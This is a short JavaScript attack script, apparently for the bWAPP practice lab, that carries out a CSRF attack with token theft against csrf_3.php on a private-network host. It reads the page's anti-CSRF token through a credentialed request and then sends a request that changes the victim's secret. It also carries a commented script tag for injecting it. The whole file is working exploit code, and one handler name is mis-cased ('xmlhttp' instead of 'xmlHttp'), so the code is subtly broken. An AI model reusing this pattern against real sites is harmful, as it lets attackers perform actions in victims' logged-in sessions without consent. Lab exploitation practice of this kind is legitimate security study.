
//<script src="http://192.168.1.58/csrf3-2-2.js"></script>

var url = "http://192.168.1.58/bWAPP/csrf_3.php";
if (window.XMLHttpRequest){
    xmlHttp = new XMLHttpRequest();
} else {
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlHttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange = function(){
    if (xmlHttp.readyState == 4 && xmlHttp.status == 200){
        var text = xmlHttp.responseText;
        var parser = new DOMParser();
        var parsedDoc = parser.parseFromString(text, "text/html");
        var token = parsedDoc.getElementsByName("token").item(0).value;
        var newUrl = "http://192.168.1.58/bWAPP/csrf_3.php?secret=SECRET&action=change&token=" + token;
        if(!hacked){
            hacked = true;
            xmlHttp.open("GET", newUrl, false );
            xmlHttp.send();  
        }
    }
};
xmlHttp.open("GET", url, false );
xmlHttp.send(); 